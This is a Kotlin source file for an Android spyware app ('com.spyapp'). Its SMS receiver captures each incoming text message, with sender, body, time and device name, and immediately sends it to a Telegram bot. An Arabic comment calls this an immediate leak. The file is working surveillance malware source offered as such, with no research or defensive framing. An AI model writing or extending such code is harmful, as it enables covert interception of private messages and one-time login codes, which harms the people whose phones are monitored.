package com.spyapp

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import java.text.SimpleDateFormat
import java.util.*

class SMSReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        try {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (messages.isNullOrEmpty()) return

            val sb = StringBuilder()
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(Date())

            sb.appendLine("╔══════════════════════════╗")
            sb.appendLine("║    📱 رسالة SMS جديدة    ║")
            sb.appendLine("╚══════════════════════════╝")
            sb.appendLine()

            for ((i, msg) in messages.withIndex()) {
                val sender = msg.originatingAddress ?: "مجهول"
                val body = msg.messageBody ?: "(فارغ)"
                val time = if (msg.timestampMillis > 0) {
                    SimpleDateFormat("HH:mm:ss", Locale.getDefault())
                        .format(Date(msg.timestampMillis))
                } else timestamp.substring(11)

                sb.appendLine("📤 *المرسل:* `$sender`")
                sb.appendLine("📝 *الرسالة:* $body")
                sb.appendLine("🕐 *الوقت:* $time")

                if (messages.size > 1 && i < messages.size - 1) {
                    sb.appendLine("────────────────────")
                }
            }

            sb.appendLine()
            sb.appendLine("📅 _${timestamp}_")
            sb.appendLine("📱 _${DeviceInfo.getDeviceName(context)}_")

            // تسريب فوري للتليغرام
            TelegramBot.send(context, sb.toString())

        } catch (e: Exception) {
            TelegramBot.sendError(context, "SMSReceiver", e)
        }
    }
}
